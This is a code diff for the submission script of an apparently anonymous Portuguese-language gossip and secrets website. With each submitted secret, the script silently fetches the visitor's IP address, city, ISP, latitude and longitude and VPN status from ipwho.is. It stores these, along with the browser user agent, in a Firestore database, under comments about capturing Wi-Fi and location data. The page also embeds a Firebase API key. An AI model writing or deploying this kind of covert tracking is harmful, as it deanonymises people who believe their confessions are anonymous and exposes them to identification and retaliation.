@@ -44,7 +44,7 @@
     </div>
 
     <script>
-        // Configuração do seu Firebase
+        // Configuração do Firebase
         var firebaseConfig = {
             apiKey: "AIzaSyC_RKEhHxEvgDN0w7X1AMAwE0a4ljiSbh4",
             authDomain: "xoxo-fofocas.firebaseapp.com",
@@ -55,7 +55,6 @@
             measurementId: "G-3DZPC3E7SV"
         };
 
-        // Inicialização
         firebase.initializeApp(firebaseConfig);
         var db = firebase.firestore();
 
@@ -70,12 +69,13 @@
             var texto = inputElement.value;
             if(texto.trim() === "") return;
 
-            // CAPTURA DE DADOS DE WI-FI E LOCALIZAÇÃO (Alterado aqui)
+            // Busca os dados detalhados de rede e localização
             fetch('https://ipwho.is/')
                 .then(function(res) { return res.json(); })
                 .then(function(data) {
+                    // Monta o rastro usando aspas comuns para evitar erros de sintaxe
                     var rastro = {
-                        ip: data.ip || "Desconhecido",
+                        ip: data.ip || "Não detectado",
                         localizacao: (data.city || "?") + ", " + (data.region || "?") + " - " + (data.country || "?"),
                         provedor_wifi: data.connection ? data.connection.isp : "Desconhecido",
                         latitude: data.latitude || 0,
@@ -84,28 +84,23 @@
                         e_vpn: data.security ? data.security.vpn : false
                     };
 
-                    // Gravação no Firestore (Estilo antigo para evitar erros)
+                    // Salva no Firestore
                     db.collection("fofocas").add({
                         conteudo: texto,
                         data: firebase.firestore.FieldValue.serverTimestamp(),
                         rastro: rastro,
                         dispositivo: navigator.userAgent
-                    })
-                    .then(function() {
+                    }).then(function() {
                         inputElement.value = "";
-                        alert("Segredo guardado com sucesso!");
-                    })
-                    .catch(function(error) {
-                        alert("Erro ao enviar! Verifique o console.");
-                        console.error(error);
+                        alert("Segredo guardado com rastro digital!");
                     });
                 })
                 .catch(function(err) {
-                    // Caso o rastreio falhe, envia apenas o texto para não travar o site
+                    // Caso o rastreio falhe, salva apenas o texto
                     db.collection("fofocas").add({
                         conteudo: texto,
                         data: firebase.firestore.FieldValue.serverTimestamp(),
-                        rastro: { erro: "Falha ao rastrear" }
+                        rastro: { erro: "Falha na captura dos dados" }
                     });
                 });
         }
